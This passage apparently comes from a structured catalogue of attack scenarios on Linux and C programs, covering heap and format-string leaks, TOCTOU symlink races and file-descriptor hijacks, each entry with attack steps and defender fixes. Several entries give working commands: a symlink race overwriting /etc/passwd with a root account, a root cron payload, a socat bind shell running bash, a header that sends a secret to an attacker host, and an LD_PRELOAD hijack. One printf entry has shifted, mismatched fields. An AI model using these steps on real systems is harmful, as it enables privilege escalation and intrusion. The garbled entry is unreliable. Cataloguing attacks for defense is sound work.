Step 4: Send input to the app that reads the freed pointer to the attacker-controlled data. Step 5: The app prints pointer metadata or memory contents, which the attacker records. Step 6: Using this info, the attacker maps heap layout and can craft UAF or buffer overflow. Step 7: Combined with write-what-where primitives, next exploit stage can escalate code execution. Step 8: Defender: free and null pointers, enable ASAN, prevent reuse of freed chunks.
Vulnerability: UAF and heap metadata exposed via reuse
Impact: Leads to arbitrary read/write in memory
Detection Method: Monitor repeated free-read operations; use memory sanitizer tools
Solution: Use safe languages, object pools, null pointers, free list hardening

Title: Uninitialized Heap Buffer
Scenario Description: Application returns buffer with leftover heap data that may contain sensitive pointers or data
Attack Steps: Step 1: Attacker finds app that processes user input, allocates buffer via malloc or new, then sends the buffer to client without fully initializing it. Step 2: Write exploit or fuzzing harness to send requests and inspect returned buffer content. Step 3: Collect leaked memory—may contain pointers, credentials, or cryptodata. Step 4: Analyze leaked data to retrieve memory layout or sensitive info. Step 5: Use pointers to further memory exploits like OOB or code execution. Step 6: Defender: always initialize memory (e.g., calloc, memset); use Valgrind or Memory Sanitizers in testing.
Vulnerability: Heap buffer not initialized before use
Detection Method: Sanitize output buffer; test with uninitialized-fuzzing tools
Solution: Enforce zero-initialization; use sanitized memory allocators

Title: Format String Leak
Scenario Description: Application uses printf(user_input)—if input tries %p, it prints memory addresses or data
Attack Steps: Step 1: Attacker finds app that logs or displays user input via printf(s). Step 2: Send input with %p or %s, e.g., %p %p %p %p. Step 3: When code runs, printf replaces %p with memory addresses from the stack or heap. Step 4: Attacker observes logs or console and records memory addresses. Step 5: Use leaked addresses to predict memory layout, ASLR bypass, or identify libc location. Step 6: With this info, chain ROP or buffer-exploit attacks. Step 7: Defender must avoid direct printf(user_input) usage—always use printf("%s", input) or sanitize input.
Detection Method: Log analysis for %p printing; detect format misuse patterns
Solution: Use safe printing; enforce code audits; compile-time warnings

Title: Out‑of‑Bounds Read (OOBR)
Scenario Description: App reads or copies buffer data without verifying index—attacker retrieves adjacent memory
Attack Steps: Step 1: Attacker fuzzes input to functions that perform buffer[i] reads without bounds check. Step 2: Identify a crash or read error beyond intended buffer size. Step 3: Use debugger to monitor values read from invalid index locations. Step 4: Request data that includes heap or stack data adjacent to buffer. Step 5: Attacker gathers bytes (e.g., memory contents, pointers, credentials). Step 6: Use this leaked data to map memory or escalate to code execution. Step 7: Defender: add bounds checks, use std::vector, enable buffer-safe APIs, fuzz with sanitizers to catch OOB.
Vulnerability: No bound checks on buffer read
Impact: Arbitrary memory leak, possible exploit vector
Detection Method: Fuzzer report detection of invalid access; memory sanitizer logs
Solution: Harden APIs, enforce safe memory functions; integrate ASan in CI

Title: Heap Overflow into Metadata
Scenario Description: Buffer overflow corrupts heap metadata (like prev/next pointers), leaking mmap or chunk info
Attack Steps: Step 1: Attacker finds function that reads user input into a heap buffer without boundary checks. Step 2: Overflows that buffer to overwrite adjacent chunk metadata (size, fd, bk). Step 3: Triggers free or malloc operations, leaking metadata fields to attacker-controlled memory. Step 4: Attacker reads data to deduce heap layout and addresses. Step 5: Use layout knowledge to forge chunks in future allocations for arbitrary memory writes. Step 6: Leads to code execution or memory corruption. Step 7: Defender: use hardened malloc (tcache, safe unlink), enable pointer encryption, remove unchecked alloc loops.
Vulnerability: Heap metadata overwritten via buffer overflow
Impact: Arbitrary memory control and code execution
Detection Method: Use memory sanitizer; detect unusual chunk metadata during free
Solution: Harden malloc, enable safe unlink, compile with heap protection flags

Title: FILE Structure Leak (libc)
Scenario Description: FILE* struct (stdout/stderr) leaked by app, exposing libc vtable pointers
Attack Steps: Step 1: Attacker identifies code that prints contents of a FILE* pointer using %p. Step 2: Sends input that triggers logging or dumping of FILE* structure. Step 3: Printed data includes libc vtable or _IO_write_base pointers. Step 4: Attacker calculates libc base address using leaked pointer minus known offset. Step 5: Using libc base, attacker crafts ROP chain or function pointer overwrite. Step 6: Gains arbitrary code execution. Step 7: Defender: avoid leaking internal structs, sanitize %p usage, enable symbol scrubbing.
Vulnerability: Internal pointer struct leaked to logs
Detection Method: Log scan for %p exposures; symbol scrubbing in release builds
Solution: Remove %p debug prints; use logging sanitize functions

Title: GOT Table Leak via Format String
Scenario Description: %n exploit prints GOT entry addresses, revealing libc base
Attack Steps: Step 1: Attacker crafts input containing '%7$s' + GOT address to pass into unsafe printf. Step 2: The vulnerable function interprets format string and reads from GOT entry, printing function pointer. Step 3: GOT entry value printed gives libc function address. Step 4: Attacker uses that to compute libc base. Step 5: Can then craft memory writes or ROP chains for code execution. Step 6: Defender: disable format string misuse, use printf("%s", input) style or compile with safe I/O mitigations.
Vulnerability: Format string misused with GOT leak
Detection Method: Audit all format string locations; runtime detection of %n usage with memory scan
Solution: Code audits; disable %n; use format-safe macros
Tags: Format string, GOT leak, libc disclosure

Title: Uncleared/Reused Memory in /tmp
Scenario Description: Temporarily stored data reused with leftover pointers or secrets
Attack Steps: Step 1: App creates a temp file with sensitive data and deletes it. Step 2: Attacker creates a symlink in /tmp/myappXXXX pointing to sensitive file. Step 3: App reuses same temp name, writing new sensitive data into old file. Step 4: Attacker reads file content via symlink or by monitoring /tmp. Step 5: Leaked data includes old pointers or confidential buffers. Step 6: Defender: use O_EXCL, sanitize temp filenames, clear buffer contents post-use.
Detection Method: Monitor /tmp symlink creation; detect temp reuse events
Solution: Enforce secure tmp file creation, sanitize path usage
Tags: Temp file leak, pointer trace leak

Title: Heap Spray with Known Pattern
Scenario Description: Attacker fills memory with identifiable data, then locates it via memory dump or address leakage
Attack Steps: Step 1: In browser JS or C++ code, attacker repeatedly allocates buffers with known pattern (e.g., 0x41414141...). Step 2: Forces OOM or reads memory via vulnerability to locate sprayed pages. Step 3: Finds pattern location to derive base addresses. Step 4: Reclaims buffer for controlled data placement. Step 5: Diverts code execution to sprayed code. Step 6: Use along with ROP or JIT vulnerabilities. Step 7: Defender: enable Guard pages, heap randomization, CFI.
Impact: Facilitates code execution via layout control
Detection Method: Monitor large page allocations; restrict predictable memory patterns
Solution: Enable heap randomization; CFI; memory guard pages

Title: Fake vtable Call (C++)
Scenario Description: Attacker corrupts object’s vtable pointer, causing method call to go to malicious function
Attack Steps: Step 1: Identify C++ class with virtual method, pointer to vtable stored at object start. Step 2: Trigger buffer overflow that overwrites vtable pointer for object. Step 3: Write address of attacker-controlled fake vtable in memory. Step 4: When method is called on object, virtual dispatch jumps into fake vtable location. Step 5: Attacker’s code executes under process privileges. Step 6: Branch can lead to shell exec or memory access. Step 7: Defender: use CFI, vtable integrity checks, hardened C++ allocators.
Impact: Arbitrary code execution via virtual dispatch
Detection Method: ASAN, CFI, vtable sandboxing, validate integrity before call
Solution: Hardened C++ mechanisms: CFI, vtable guards, safe pointers
Tags: Fake vtable, C++ exploit, vtable hijack

Title: Printf on Heap Address Input
Scenario Description: A program logs user input directly using printf(input)—if input is a pointer, the program prints raw memory
Tools Used: Custom C app, printf, log viewer
Attack Steps: Step 1: Attacker finds an input field or chatbot interface feeding directly to printf(input). Step 2: They enter a value like %p, or even 0x7ffd12345678. Step 3: The app treats it as a format string and attempts to print pointer contents. Step 4: printf interprets the string—%p reads a pointer from the stack or memory at given address. Step 5: The pointer value or memory contents are printed to logs or console. Step 6: Attacker learns exact memory layout—stack, heap, or libc addresses. Step 7: Use this to bypass ASLR and build further memory exploits. Step 8: Defender must never pass untrusted input directly to printf(); always use printf("%s", input), and sanitize format specifiers.
Detection Method: Scan code for printf(user_input) patterns; monitor logs for %p or address leaks
Solution: Use safe printing functions; sanitize format strings; apply compiler warnings

Title: Function Pointer Leak via Serialization
Scenario Description: Vulnerable RPC or protobuf format dumps object function pointers in clear, allowing attacker to learn their addresses
Attack Steps: Step 1: Attacker interacts with an RPC server or app using protobuf/uJSON deserialization of complex object. Step 2: The server unserializes objects including pointers for callbacks or handlers. Step 3: Attacker requests a serialization dump or triggers logging of object contents. Step 4: Server sends back data containing memory addresses for function pointers or objects. Step 5: Attacker reads pointers and computes base addresses for binary or libc. Step 6: With known addresses, they craft exploits like pointer overwrite or code injection. Step 7: Defender must sanitize serialization schemas to avoid pointers/addresses, and disable unsafe pickle or serde usages.
Detection Method: Audit serialization schemas; scan code for pointer dumps
Solution: Use safe ID-based references; remove pointer serialization; enable hardened serializers

Title: Race Condition in Logging
Scenario Description: Two threads log concurrently: one clears buffer, the other logs before init—causes old heap data to leak
Attack Steps: Step 1: Attacker finds a program with multithreaded logging. Step 2: The log routine reuses a heap buffer but doesn’t ensure initialization. Step 3: Attacker races by sending two concurrent requests: one to allocate and init the log buffer, the other to cause it to log before init. Step 4: The second thread gets uninitialized heap data instead of correct content. Step 5: Attacker captures the logged output containing old memory values—could contain pointers, secrets, or data. Step 6: Use leaked addresses to bypass ASLR or collect credentials. Step 7: Defender must synchronize logging, buffer-init, and remove race conditions. Use tools like Valgrind or ThreadSanitizer.
Vulnerability: Race allows logging before buffer init
Impact: Heap memory leak, potential pointer leakage
Detection Method: Log pattern anomalies; detect uninitialized buffer reads
Solution: Add thread-safe logging with proper initialization; use static-length buffers

Title: OpenSSL BIO Leak
Attack Type: Leak SSL Internal Structures via BIO Dump
Scenario Description: A service uses BIO_dump() for debugging and accidentally logs internal OpenSSL pointers and content
Attack Steps: Step 1: Attacker finds a TLS-based service that enables verbose logging (e.g., debug option). Step 2: During handshake, the server logs internal SOAP_MODULE via BIO_dump() or puts(). Step 3: This function prints memory in hex, including vtable pointers, session keys, or struct pointers. Step 4: Attacker reads logs or debug output to extract SSL internals. Step 5: Use pointers to guess memory layout or crack session keys. Step 6: With key and structure info, mount a MitM or session hijack attack. Step 7: Defender must remove BIO_dump() from production and avoid verbose SSL debug logs.
Vulnerability: OpenSSL debug logs reveal pointers and keys
Impact: SSL internal data leak, session hijack
Detection Method: Monitor verbose SSL logs; detect BIO_dump() usage
Solution: Remove debug code in production; restrict logging verbosity to ERROR-only

Title: Leak via Error Message Stack Trace
Scenario Description: Stack trace or error dump includes object pointers, names, or other stack data in Python or Java applications
Attack Steps: Step 1: Attacker triggers an exception in a Python or Java service (e.g., by sending invalid input). Step 2: The service logs full stack trace including local variables or memory values. Step 3: Stack trace may include addresses (e.g., 0x7f2d12345abc) or data pointers. Step 4: Attacker parses logs to read pointer values and memory content. Step 5: Use those to derive ASLR base or sensitive object state. Step 6: Follow-up exploit might target deserialization or reflection vulnerabilities. Step 7: Defender logs only minimal error messages, disables stack trace in production, and filters out pointers.
Vulnerability: Stack trace exposure includes pointer data
Detection Method: Monitor logs for memory addresses like 0x...; detect stack traces
Solution: Disable stack trace exposure; sanitize error dumps in production

Title: Use of malloc_usable_size()
Scenario Description: Application returns heap buffer size using malloc_usable_size()—revealing internal buffer sizes to attackers
Attack Steps: Step 1: Attacker uses service that allocates memory and then calls malloc_usable_size(ptr) and returns it in API. Step 2: This API reveals how large the allocated block behind ptr is—often bigger than requested. Step 3: Attacker uses repeated calls to infer heap layout and glibc behavior. Step 4: This information aids in creating precise heap sprays or overflows. Step 5: Use this data to craft OOB writes or UAF exploits. Step 6: Defender must avoid exposing malloc_usable_size APIs to untrusted users, and disable glibc per-chunk size leak.
Vulnerability: Exposing heap chunk size gives allocator info
Impact: Heap layout knowledge, precise memory attacks
Detection Method: Check code for exposing malloc_usable_size; monitor suspicious usage
Solution: Remove or guard that API; use hardened allocators or allocator metadata obfuscation

Title: Memory Corruption + Side Channel
Scenario Description: Attacker measures how fast memory is accessed to infer what is present in cache or protected memory
Attack Steps: Step 1: Attacker runs a process on same system as target (shared CPU or hyperthreaded core). Step 2: They choose a memory location shared across both apps (e.g., shared library or table). Step 3: Attacker "flushes" a memory location from CPU cache using clflush or timing tricks. Step 4: Target program runs, and if it accesses that memory, the cache is refilled. Step 5: Attacker re-reads the memory and measures access time. Step 6: Fast access = memory was used → infer what target did or what data was accessed. Step 7: This can leak encryption keys, control flows, or secret bits. Step 8: Defender can mitigate using constant-time operations and cache partitioning.
Vulnerability: Cache shared between attacker and victim
Detection Method: Use perf, monitor clflush/syscalls, look for low-level timing access
Solution: Use cache flushing restrictions, disable hyperthreading, constant-time code

Title: SIGSEGV Error Dump
Scenario Description: Crashed processes dump internal state, revealing heap or stack pointers
Attack Steps: Step 1: Attacker causes app to crash (e.g., send input causing NULL deref or bad pointer). Step 2: Linux automatically writes a core file (if allowed) into /var/crash/ or current directory. Step 3: Core file contains full register state (RIP, RSP), stack, heap, and memory. Step 4: Attacker reads the dump (e.g., with gdb core). Step 5: They search for useful leaks like addresses of heap, stack, or libc base. Step 6: With those, bypass ASLR and prepare return-to-libc or ROP chain. Step 7: Defender must disable core dumps in production via ulimit -c 0 or restrict access to dump files.
Detection Method: Check for core.* files, restrict read access to /proc, core_pattern
Solution: Set ulimit -c 0 for production, secure /proc, restrict file access

Title: IPC Shared Memory Leaks
Attack Type: mmap or shm leaks between processes
Scenario Description: Shared memory is not cleared before reuse, leaking another process’s pointer or data
Attack Steps: Step 1: Two processes (A and B) use shared memory (e.g., via shmget() or mmap() on tmpfs). Step 2: Process A writes to memory but doesn't clear or restrict content. Step 3: Process B maps the same region and reads stale or sensitive data left by A (like a password, pointer, or struct). Step 4: This may happen if IPC permissions are weak or leftover pages are reused. Step 5: Attacker reads shared memory region using gdb or dump tools. Step 6: Leaked data reveals internal memory layout, credentials, or session info. Step 7: Defender must memset() shared memory before releasing it and enforce permissions on IPC objects.
Vulnerability: Insecure IPC cleanup or improper memory init
Detection Method: Monitor IPC objects with ipcs, log memory-mapped region reuse
Solution: Always zero out IPC memory, use access flags, destroy segments post-use

Title: Heap Leak via /proc/self/maps
Scenario Description: On Linux systems, /proc/self/maps can leak heap addresses which allow attackers to bypass ASLR and craft potent memory corruption exploits.
Tools Used: Linux Terminal, cat, C program, GDB
Attack Steps: Step 1: Attacker obtains limited local access on a Linux system (e.g., via restricted shell or low-privilege user). Step 2: They examine memory layout by running cat /proc/self/maps. This outputs memory regions including [heap] and address ranges, revealing the heap's base address. Step 3: Attacker parses the output to identify the start and end addresses of the heap segment. Step 4: Armed with the heap base, they run or compile a vulnerable binary (e.g., a custom C program with a buffer overflow or use-after-free bug). Step 5: They feed crafted input to that binary, using absolute heap pointers to overwrite critical structures (e.g., function pointers, object vtable). Step 6: By knowing exact heap addresses, ASLR cannot randomize them, allowing precise memory corruption. Step 7: Payload may include overwriting return addresses or hijacking control flow in C-based services. Step 8: Attacker launches the exploit, triggering code execution or memory manipulation inside the vulnerable process. Step 9: As a proof, they may spawn a shell using system("/bin/sh") or execute privileged code. Step 10: Defender won’t detect this unless abnormal memory reads or binary crashes are logged.
Detection Method: Monitor use of /proc/self/maps and debug logs; detect unusual memory reads or binary anomalies
Solution: Disable read permissions to /proc, use hardened kernels, enforce no-heap-info processes (e.g., hide pid), apply PIE/stack canaries
Tags: ASLR bypass, Heap Leak, Memory Exploit

Title: DNS/HTTP Header Echo Leak
Attack Type: Reflect secret in DNS or HTTP headers
Scenario Description: Headers or tokens embedded in responses or DNS requests leak internal state or user secrets
Attack Steps: Step 1: Attacker injects crafted input into app (e.g., X-Forwarded-For header: attacker.com?secret=xyz). Step 2: App echoes that input in logs, DNS requests, or HTTP error responses. Step 3: Attacker monitors their server (e.g., via DNS or HTTP logs) for callbacks. Step 4: Response includes sensitive content—like internal hostname, auth tokens, cookies, or headers. Step 5: Attacker reads this info from logs or captured packets. Step 6: Defender must validate and sanitize all incoming headers and block reflective debug behavior.
Vulnerability: Reflection or echo of attacker-controlled input
Detection Method: Monitor external HTTP headers or DNS requests for suspicious patterns
Solution: Sanitize headers, disable external echoes, monitor outbound logs

Title: Exploit Heap Management Info (e.g., mallinfo())
Scenario Description: Attackers use functions like mallinfo() or /proc/pid/status to get heap size or base info.
Attack Steps: Step 1: Attacker runs or attaches to a process that uses glibc-based memory allocation. Step 2: Calls mallinfo() or malloc_info() inside the app or externally via introspection. Step 3: These functions expose heap metrics like total allocated space, chunks used, and base heap pointer. Step 4: Alternatively, attacker checks /proc/[pid]/status or /proc/[pid]/maps to see memory layout. Step 5: They combine info with known heap allocator structure (e.g., glibc ptmalloc) to calculate exact heap base. Step 6: This helps attacker plan heap spray, overflow, or pointer overwrite attacks. Step 7: Defender should avoid exposing heap metrics to users or via debugging interfaces.
Vulnerability: glibc heap info exposed to untrusted actors
Impact: Heap layout discovery → heap spray, overflow
Detection Method: Monitor use of mallinfo(), audit /proc/ exposure
Solution: Hide heap info in prod; restrict /proc access; avoid exposing malloc_info() APIs

Title: Leaky Logging of Internal Objects
Scenario Description: Debug logs output object addresses or internal memory structures revealing heap info
Attack Steps: Step 1: Developer adds verbose debug logging that includes pointers or memory dumps. Step 2: When app crashes or logs routine events, it prints messages like object at 0x564f1230 or memory dump buffers. Step 3: Attacker inspects logs (e.g., via leaked files, /var/log, dev console). Step 4: They extract heap or libc addresses and use them to bypass ASLR or infer object layout. Step 5: This leak can also reveal object types, heap allocator state, or even function pointers. Step 6: Defender must sanitize logs, never print raw pointers or memory addresses.
Vulnerability: Unsafe logging of pointers or internal object refs
Detection Method: Scan logs with grep 0x, audit log verbosity level
Solution: Sanitize log output; use structured logging without raw memory

Title: Out-of-Scope Object Reuse
Scenario Description: Object pooling incorrectly reuses memory containing previous data
Attack Steps: Step 1: App allocates an object (e.g., user session, struct, list node). Step 2: Frees object but memory not zeroed or cleaned. Step 3: Attacker reconnects or triggers reallocation, causing reused object to contain old data. Step 4: Attacker reads previous session's memory (e.g., tokens, user data, heap layout). Step 5: This is especially dangerous in object pools, thread-local storage, or C++ STL containers. Step 6: Defender must sanitize memory before reuse or use secure allocators. Step 7: Can be chained with UAF or object confusion bugs.
Vulnerability: Unsafe reuse of freed heap memory
Detection Method: Track object pool reuse; fuzz test for stale memory
Solution: Use secure allocators, memset() before reuse, C++ smart pointers

Title: Heap Leak via Integer Truncation
Scenario Description: Overflow in size field causes memory reader to spill into adjacent heap space
Attack Steps: Step 1: Attacker sends crafted file or packet with declared size like length = 0xFFFFFFFF. Step 2: Application calculates buffer size using 32-bit or unsigned math. Step 3: When parsed, code allocates small or zero buffer but tries to read length bytes, causing out-of-bounds read into adjacent heap objects. Step 4: Attacker reads previous memory from heap: credentials, tokens, structure pointers. Step 5: This is common in file format parsers, image loaders, and media players. Step 6: Defender must validate all size fields and use secure parsing libraries.
Vulnerability: Integer math on attacker-controlled size fields
Detection Method: Fuzz with AFL for truncation/overflow bugs; monitor for excessive reads
Solution: Use bounds-checking libraries; avoid raw malloc(size) from external input

Title: Memory Dump via Format Conversion
Scenario Description: Serializers (e.g., JSON, XML, YAML) include raw object addresses in output
Attack Steps: Step 1: App uses custom or unsafe serializer to export internal object to JSON, XML, or YAML. Step 2: Developer logs or sends object directly without stripping pointer fields. Step 3: Attacker views raw export (e.g., API output, file, log) and sees memory layout—"object": {"ptr": 0x7ff1234}. Step 4: They infer heap base, object size, or type info. Step 5: In Protobufs or Pickle, this may even include function pointers or vtable references. Step 6: Defender must scrub outputs and use safe serialization libraries (e.g., omit __dict__ directly).
Vulnerability: Unsafe format conversion with internal memory refs
Impact: Heap object pointer or libc leak
Detection Method: Inspect logs/API for pointer-looking fields (0x...); scan debug exports
Solution: Strip pointers during serialization; whitelist fields to export

Title: Race Between malloc/free in Threads
Scenario Description: Threads race between malloc and free, exposing stale heap pointer or triggering use-after-free
Attack Steps: Step 1: Two threads operate on same shared object (e.g., buffer or task queue). Step 2: Thread A frees object while Thread B is still using it. Step 3: Thread B accesses freed memory, reading stale data or crashing. Step 4: Attacker exploits this by racing to trigger UAF, corrupting pointer, or leaking heap structure. Step 5: This bug is hard to reproduce but dangerous. Step 6: Defender must use mutex locks, atomic operations, or thread-safe data structures (e.g., std::shared_ptr). Step 7: Tools like ThreadSanitizer or Valgrind can detect this during testing.
Vulnerability: Lack of locking leads to stale memory access
Impact: Heap leak, data corruption, segmentation fault
Detection Method: Use ThreadSanitizer in CI; fuzz multithreaded interactions
Solution: Always use locking or atomic operations around heap; secure coding practices

Title: printf(user_input) With Heap Ptr
Scenario Description: Application calls printf(user_input) without format string validation, allowing attacker to leak heap addresses.
Attack Steps: Step 1: Find a program or binary where user input is passed directly to printf() (e.g., printf(user_input)), without specifying a format string (like printf("%s", user_input)). Step 2: This creates a format string vulnerability — meaning attacker-supplied format tokens like %x, %p, %s will be interpreted by printf() to read memory from the stack or heap. Step 3: Run or craft an input like %p %p %p or %x %x %x to leak values. One of these might print a pointer to a heap buffer if the heap address is in scope. Step 4: Observe the output: if you see values like 0x55f47a88 or similar, that's a memory leak. If %s is used and it points to a heap buffer, it may dump the heap content. Step 5: You can fuzz the offset using %<n>$p to find the heap variable you're targeting. Example: %7$p, %8$p, etc. Step 6: If vulnerable, attacker can extract heap layout, libc base address, or even session tokens in memory. Step 7: Use gdb with set follow-fork-mode child, break on printf, and dump heap to confirm. Step 8: This vulnerability is commonly used in CTFs or real-world apps (especially embedded, firmware, or low-level C/C++ tools) that improperly use printf-like functions. Step 9: Defender should always validate format strings and never directly pass user input to printf-like APIs.
MITRE Technique: T1040 – Exfiltration Over Other Network Medium
Impact: Heap memory disclosure, libc/stack base leak
Detection Method: Log unusual format strings; scan input logs with regex for `%x
Solution: %p` patterns
Tags: Use printf("%s", user_input) instead of printf(user_input); enforce compiler warnings
Source: format string, heap leak, libc, printf

Title: TOCTOU Race with Open File Descriptor (tmpfile) Exploit
Attack Type: TOCTOU (Race Condition via Temporary File Handling)
Scenario Description: An attacker exploits a Time-of-Check to Time-of-Use race condition by replacing a temporary file between the check and use phases to manipulate or escalate privileges.
Tools Used: strace, ln, bash, gcc, nano, sleep, cron
Attack Steps: Step 1: Understand what TOCTOU means: A Time-of-Check to Time-of-Use vulnerability happens when a program checks a resource (like a file) and then later uses it, but the resource is changed in between by an attacker. This is common when using temporary files in /tmp. Step 2: Choose a target program that creates and uses a temporary file in /tmp insecurely. You can simulate this using a simple C program that opens a file using tmpfile() or hardcoded /tmp/something. Step 3: Create a vulnerable C program like: int main() { FILE *fp = fopen("/tmp/mytemp", "w"); if (fp) { fprintf(fp, "Sensitive data\n"); fclose(fp); } return 0; } Compile it: gcc -o victim victim.c Step 4: This program checks if the file exists and then opens it. You will exploit this by racing to replace /tmp/mytemp with a symbolic link to a sensitive file (like /etc/passwd) after the check but before the use. Step 5: Write an attacker script to constantly delete and replace /tmp/mytemp with a symbolic link using: while true; do rm -f /tmp/mytemp; ln -s /etc/passwd /tmp/mytemp; done Step 6: In another terminal, keep running the victim program rapidly: while true; do ./victim; done Step 7: If your timing is correct, the victim will open /etc/passwd instead of the intended temp file and write to it — which might corrupt or modify it. If the file is sensitive, like a shell script run by root (cron, init.d, etc.), this could lead to privilege escalation. Step 8: You can create a fake root cron job file to gain root shell access using similar TOCTOU tricks. E.g., symlink a writable /tmp/mycron to /etc/cron.d/rootjob and insert * * * * * root /bin/bash -c 'echo hacked > /tmp/pwned' to gain execution. Step 9: Monitor if /tmp/pwned appears after the cron executes. This confirms privilege escalation. Step 10: TOCTOU is extremely timing-based and may not succeed every time. You may use sleep, multithreading in C, or tools like inotifywait to increase precision. Step 11: This shows how poor file handling (not using O_EXCL, O_CREAT, or mkstemp) can lead to race condition exploits. This is real-world and used in many Linux privilege escalation attacks historically. Step 12: Clean up: Remove any created symlinks, test files, or cron jobs used. Do not attempt on production or non-sandboxed machines.
Detection Method: Use auditd, strace, and check logs for temp file access anomalies and symlink traversal in /tmp
Solution: Use mkstemp() instead of tmpfile(), apply correct permissions, avoid predictable file paths in /tmp
Tags: TOCTOU, Race Condition, tmpfile, Privilege Escalation

Title: FD Leak via fork/exec
Scenario Description: Forked or executed processes inherit open file descriptors, unintentionally exposing sensitive file handles.
Attack Steps: Step 1: Identify a daemon or SUID binary that opens sensitive files (e.g., /etc/shadow, /root/.ssh/id_rsa) and then spawns child processes using fork() or exec(). Step 2: Use ps aux and ls /proc/[pid]/fd/ to inspect open file descriptors in live processes. Step 3: If a privileged parent leaks its FD to a non-privileged child, you can access contents via /proc/[pid]/fd/[fd_num]. Step 4: Exploit this by rapidly spawning and monitoring children from a known SUID binary or daemon using a script: while true; do for pid in $(pgrep -u root); do ls -l /proc/$pid/fd/; done; done Step 5: If /proc/[pid]/fd/3 points to a sensitive file, read it: cat /proc/[pid]/fd/3. Step 6: Use lsof -p PID for more context on FD mapping. This is commonly used in CTFs and real-world misconfigurations.
Vulnerability: Inherited sensitive FD in child process
Detection Method: Monitor FD inheritance, check /proc/[pid]/fd exposure, enforce O_CLOEXEC flag
Solution: Set FD_CLOEXEC on sensitive FDs, use close() pre-exec, avoid leaking sensitive file handles

Title: Hijack netcat or socat FD
Attack Type: FD hijack via malicious socket replacement
Scenario Description: Replace socat or netcat connection endpoint with malicious one to capture or inject data.
Attack Steps: Step 1: Identify a service or script that uses socat or netcat to connect to remote systems or expose file descriptors (e.g., backup over socket). Step 2: Replace the intended listener endpoint with a malicious listener controlled by the attacker. For example, run: socat TCP-LISTEN:4444,fork EXEC:/bin/bash on attacker machine. Step 3: If a local binary connects to this, it will run bash connected to the attacker’s socket — giving a shell. Step 4: Alternatively, hijack an existing FD used by netcat/socat and inject commands or siphon data. Step 5: Monitor the FD in /proc/[pid]/fd/ or attach strace to inspect network FDs. Step 6: This can allow reverse shell creation, MITM, or arbitrary command execution depending on how the original command is structured.
Detection Method: Monitor TCP listener activity, netcat/socat spawning patterns
Solution: Avoid using socat/netcat for sensitive data; enforce TLS and restrict executable FD usage
Tags: Netcat, Socat, FD Hijack, Reverse Shell

Title: Symlink Swap Before FD Use
Attack Type: File replaced with symlink to sensitive file
Scenario Description: Attacker races to replace a file with a symlink to overwrite critical files.
Attack Steps: Step 1: Monitor the system or script writing to predictable files (e.g., /tmp/report, /tmp/output.log). Step 2: Delete and quickly replace the target file with a symlink: rm /tmp/report; ln -s /etc/passwd /tmp/report Step 3: When the vulnerable script writes to /tmp/report, it will overwrite /etc/passwd. Step 4: You can inject a fake root user line into /etc/passwd, like evil:x:0:0::/root:/bin/bash, then su evil. Step 5: This requires fast timing or looped attack scripts. Step 6: This is a classic privilege escalation used in many Linux exploits.
Impact: File overwrite, root shell, system compromise
Detection Method: Use auditd or inotify to watch symlink changes in /tmp; monitor file writes
Solution: Use O_NOFOLLOW, O_EXCL, mkstemp(); avoid predictable paths in /tmp

Title: Proc FD Injection
Scenario Description: Access or replace open files via another process’s /proc/[pid]/fd interface.
Attack Steps: Step 1: Identify a target process PID via ps aux, e.g., a privileged script or binary. Step 2: Check its file descriptors: ls -l /proc/[pid]/fd to see which files are open. Step 3: Use cat /proc/[pid]/fd/3 to read the contents of FD 3. If it points to a secret config or password file, you can access its content without permissions. Step 4: You can also write into writable FDs by echoing into them: echo 'malicious line' > /proc/[pid]/fd/4. Step 5: This allows bypassing normal file permissions since access is through the already-open FD. Step 6: Some exploits create /proc/[pid]/fd symlinks and then perform injections without triggering classic file permissions checks. Step 7: Combine with LD_PRELOAD or gdb attach for deeper injection.
Detection Method: Monitor /proc/[pid]/fd/ access by unprivileged users, lock down /proc with hidepid=2 in /etc/fstab
Solution: Restrict /proc, sanitize FD access, avoid keeping sensitive files open in long-lived privileged processes

Title: FD Overwrite via /dev/fd/0 Trick
Attack Type: Abuse stdin redirection via special FD path
Scenario Description: Abusing /dev/fd/0 to inject input into commands or scripts that blindly read from stdin.
Attack Steps: Step 1: Understand /dev/fd/0 refers to file descriptor 0 (stdin) in Unix-like systems. Many scripts or commands (like bash -c, python, cat) read from it. Step 2: Create a malicious input file like echo "echo hacked > /tmp/pwned" > input.sh. Step 3: Redirect this input file as FD 0: bash -c /dev/fd/0 < input.sh or bash < /dev/fd/0 < input.sh. Step 4: Bash treats /dev/fd/0 as stdin and executes the injected script. You now have arbitrary command injection. Step 5: This is especially dangerous in cron jobs, systemd scripts, or wrappers that use bash -c or system("/dev/fd/0"). Step 6: This trick works for abusing stdin-driven programs or when injecting into user pipes or unsafe eval logic.
Vulnerability: Unvalidated use of stdin for input parsing
Impact: Arbitrary code execution via FD redirection
Detection Method: Monitor usage of /dev/fd/*, especially in cron/system commands
Solution: Avoid parsing /dev/fd/0, validate inputs, sanitize command input
Tags: FD Redirection, Command Injection, Bash Exploit

Title: Hijack dup2() Usage Before exec()
Attack Type: Malicious FD hijack before process switch
Scenario Description: If a wrapper process uses dup2() to replace stdin/stdout before exec(), attacker can control the stream.
Attack Steps: Step 1: Create a wrapper program that uses dup2() to redirect file descriptors just before calling exec() to a new binary (common in sandboxing). Step 2: An attacker provides a malicious file or FD that gets duped to stdin, stdout, or stderr. For example, dup FD 0 to a malicious FIFO. Step 3: The exec’d process inherits those manipulated descriptors. Step 4: If the target process (e.g., a root SUID binary) reads from stdin or logs to stdout, it is now under attacker control. Step 5: This allows data injection, info leak, or command injection if stdin is interpreted. Step 6: Use gdb or strace to observe the exec and fd mapping pre and post dup2(). Can chain with LD_PRELOAD to inject pre-exec behavior.
Detection Method: Observe dup2() and exec() patterns, audit programs that replace FDs pre-exec
Solution: Validate pre-exec logic; securely map FDs with checks; avoid stdin/stdout dependency in root processes
Tags: dup2, Exec Hijack, Priv Esc, Pre-Exec

Title: LD_PRELOAD Injected Pipe Control
Attack Type: Hook library function to redirect data or FDs
Scenario Description: Injecting a malicious shared object via LD_PRELOAD to hijack file descriptors, pipes, or function outputs.
Attack Steps: Step 1: Write a shared library that overrides a libc function like open, write, or read. Example: override write() to redirect output to your file. Step 2: Compile the library: gcc -fPIC -shared -o hijack.so hijack.c -ldl. Step 3: Run the vulnerable program with LD_PRELOAD=./hijack.so ./targetbinary. Step 4: Your malicious write() function captures or redirects all output from the target. Step 5: You can use this to redirect logs, siphon secrets, or inject responses into pipes or sockets. Step 6: Combine with FD redirection to hijack stdout/stderr and bypass logging or gain visibility. Step 7: Effective for hijacking pipes or IPC between daemons.
Impact: Memory snooping, RCE, stealth data access
